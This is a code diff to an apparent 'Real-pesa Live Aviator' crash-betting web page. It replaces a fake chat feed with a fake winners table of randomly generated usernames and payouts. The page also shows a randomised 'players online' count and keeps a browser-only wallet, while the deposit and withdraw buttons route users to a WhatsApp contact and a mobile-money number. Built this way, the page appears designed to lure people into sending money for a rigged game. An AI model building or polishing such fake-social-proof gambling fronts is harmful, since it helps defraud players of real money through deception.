@@ -9,8 +9,8 @@ input{width:90%;padding:10px;margin:5px 0;border-radius:8px;border:none;backgrou
 .btn{width:95%;padding:15px;border:none;border-radius:10px;font-weight:bold;font-size:1.1rem;cursor:pointer;margin-bottom:10px;}
 .bet{background:var(--m);color:#fff;}.cash{background:#fbc02d;color:#000;}.wd-btn{background:#25d366;color:#fff;}.dep-btn{background:var(--p);color:#fff;}
 .auto-sec{margin:10px 0;font-size:0.8rem;display:flex;justify-content:center;gap:8px;}
-.chat{margin:10px;background:#111;border-radius:10px;height:100px;display:flex;flex-direction:column;}
-#msgs{flex-grow:1;padding:10px;font-size:0.75rem;text-align:left;overflow-y:auto;color:#bbb;}.win{color:#fbc02d;font-style:italic;}
+.winners-table{margin:10px;background:#111;padding:10px;border-radius:10px;font-size:0.8rem;}
+table{width:100%;border-collapse:collapse;}th{color:var(--m);padding-bottom:5px;}td{padding:5px;border-bottom:1px solid #222;}
 </style></head><body>
 <header>Real-pesa Live Aviator <div class="live-n">● <span id="online">142</span> Players Online</div></header>
 <div class="hist" id="hist"><span>History:</span></div>
@@ -26,11 +26,17 @@ input{width:90%;padding:10px;margin:5px 0;border-radius:8px;border:none;backgrou
     <button class="btn dep-btn" onclick="deposit()">DEPOSIT (POCHI)</button>
     <button class="btn wd-btn" onclick="withdraw()">WITHDRAW</button>
 </div>
-<div class="chat"><div id="msgs"><div class="msg"><b>System:</b> Deposit via Pochi: 0797097831</div></div></div>
+<div class="winners-table">
+    <table><thead><tr><th>User</th><th>Multiplier</th><th>Win (KES)</th></tr></thead>
+    <tbody id="win-rows">
+        <tr><td>User_721</td><td>4.50x</td><td>KES 2,250</td></tr>
+        <tr><td>User_104</td><td>12.10x</td><td>KES 6,050</td></tr>
+    </tbody></table>
+</div>
 <footer style="font-size:0.7rem;color:#888;padding-bottom:10px;">Pochi: 0797097831</footer>
 <script>
 let m=1.0, isFlying=false, myBet=0, h=[], iv, wallet=0;
-const x=document.getElementById('mult'), s=document.getElementById('stat'), b=document.getElementById('btn'), ms=document.getElementById('msgs'), bl=document.getElementById('bal');
+const x=document.getElementById('mult'), s=document.getElementById('stat'), b=document.getElementById('btn'), bl=document.getElementById('bal'), wr=document.getElementById('win-rows');
 function addH(v){h.unshift(v);if(h.length>5)h.pop();let html='<span>History:</span>';h.forEach(i=>{html+=`<span class="h-item">${i}x</span>`});document.getElementById('hist').innerHTML=html;}
 function loop(){
     isFlying=true; m=1.0; x.style.color="#fff"; s.innerText="Flying...";
@@ -40,7 +46,6 @@ function loop(){
         m+=0.01; x.innerText=m.toFixed(2)+"x";
         let autoAt = parseFloat(document.getElementById('auto-val').value);
         if(myBet>0 && autoAt > 0 && m >= autoAt){ cashOut(); }
-        if(Math.random()>0.98){ ms.innerHTML+=`<div class="win">User_${Math.floor(Math.random()*999)} cashed out at ${m.toFixed(2)}x</div>`; ms.scrollTop=ms.scrollHeight; }
         if(m>=crash){ clearInterval(iv); isFlying=false; addH(m.toFixed(2));
             x.innerText="FLEW AWAY!"; x.style.color="var(--r)"; s.innerText="Waiting...";
             if(myBet>0){ b.innerText="PLACE BET"; b.className="btn bet"; myBet=0; }
@@ -55,14 +60,12 @@ function action(){
 }
 function cashOut(){
     let win = (myBet * m); wallet += win; bl.innerText = "KES " + wallet.toFixed(2);
+    let newRow = `<tr><td>User_${Math.floor(Math.random()*900+100)}</td><td>${m.toFixed(2)}x</td><td>KES ${win.toFixed(0)}</td></tr>`;
+    wr.innerHTML = newRow + wr.innerHTML; if(wr.rows.length>5)wr.deleteRow(5);
     alert("Won KES "+win.toFixed(2)); b.innerText="PLACE BET"; b.className="btn bet"; myBet=0;
 }
-function deposit(){
-    window.location.href = `https://wa.me/254797097831?text=${encodeURIComponent("Hello Admin, I want to deposit KES. Send me the Pochi details.")}`;
-}
-function withdraw(){
-    window.location.href = `https://wa.me/254797097831?text=${encodeURIComponent("Hello Admin, I want to withdraw KES " + wallet.toFixed(2) + " from Real-pesa.")}`;
-}
+function deposit(){ window.location.href = `https://wa.me/254797097831?text=${encodeURIComponent("Hello Admin, I want to deposit KES. Send me the Pochi details.")}`; }
+function withdraw(){ window.location.href = `https://wa.me/254797097831?text=${encodeURIComponent("Hello Admin, I want to withdraw KES " + wallet.toFixed(2) + " from Real-pesa.")}`; }
 setInterval(()=>{document.getElementById('online').innerText=Math.floor(Math.random()*20+130);},5000);
 loop();
 </script></body></html>
